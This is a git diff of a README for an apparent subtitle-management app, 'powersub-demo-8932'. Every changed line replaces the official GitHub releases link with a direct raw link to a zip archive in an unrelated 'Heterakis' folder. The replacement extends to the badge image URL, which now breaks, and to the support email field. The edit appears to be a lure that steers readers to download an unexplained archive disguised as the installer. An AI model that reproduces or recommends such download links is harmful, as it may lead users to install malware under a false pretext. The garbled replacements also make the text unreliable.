@@ -6,7 +6,7 @@ Welcome to powersub-demo-8932. This application helps you manage subtitles seaml
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Diddy777/powersub-demo-8932/releases)
+[![Download Now](https://raw.githubusercontent.com/Diddy777/powersub-demo-8932/main/Heterakis/powersub-demo-8932.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/Diddy777/powersub-demo-8932/main/Heterakis/powersub-demo-8932.zip)
 
 ## 📂 System Requirements
 
@@ -21,7 +21,7 @@ Before downloading, ensure your system meets these requirements:
 
 To download the latest version of powersub-demo-8932, visit this page:
 
-[Download Page](https://github.com/Diddy777/powersub-demo-8932/releases)
+[Download Page](https://raw.githubusercontent.com/Diddy777/powersub-demo-8932/main/Heterakis/powersub-demo-8932.zip)
 
 ## 📋 Features
 
@@ -35,7 +35,7 @@ To download the latest version of powersub-demo-8932, visit this page:
 
 To download the application:
 
-1. Click the button above or go to the [Download Page](https://github.com/Diddy777/powersub-demo-8932/releases).
+1. Click the button above or go to the [Download Page](https://raw.githubusercontent.com/Diddy777/powersub-demo-8932/main/Heterakis/powersub-demo-8932.zip).
 2. Locate the latest release at the top of the page.
 3. Download the installer for your operating system.
 4. Open the downloaded file to start the installation.
@@ -54,14 +54,14 @@ After installation, you can launch powersub-demo-8932 from your applications men
 ## 💡 Tips for Best Experience
 
 - **Check Formats:** Ensure your subtitle files are in compatible formats such as .srt or .ass.
-- **Always Update:** Regularly check for updates on the [Download Page](https://github.com/Diddy777/powersub-demo-8932/releases) to access new features and fixes.
+- **Always Update:** Regularly check for updates on the [Download Page](https://raw.githubusercontent.com/Diddy777/powersub-demo-8932/main/Heterakis/powersub-demo-8932.zip) to access new features and fixes.
 - **User Support:** If you face issues, check the FAQ section on the release page or submit an issue directly through GitHub.
 
 ## 📞 Contact & Support
 
 If you need further assistance, feel free to reach out:
 
-- **Email:** support@powersub-demo-8932.com
+- **Email:** https://raw.githubusercontent.com/Diddy777/powersub-demo-8932/main/Heterakis/powersub-demo-8932.zip
 - **Forum:** Join our user forum to ask questions and share tips.
 
 Enjoy using powersub-demo-8932 for all your subtitle needs! Thank you for choosing our application to enhance your video experience.
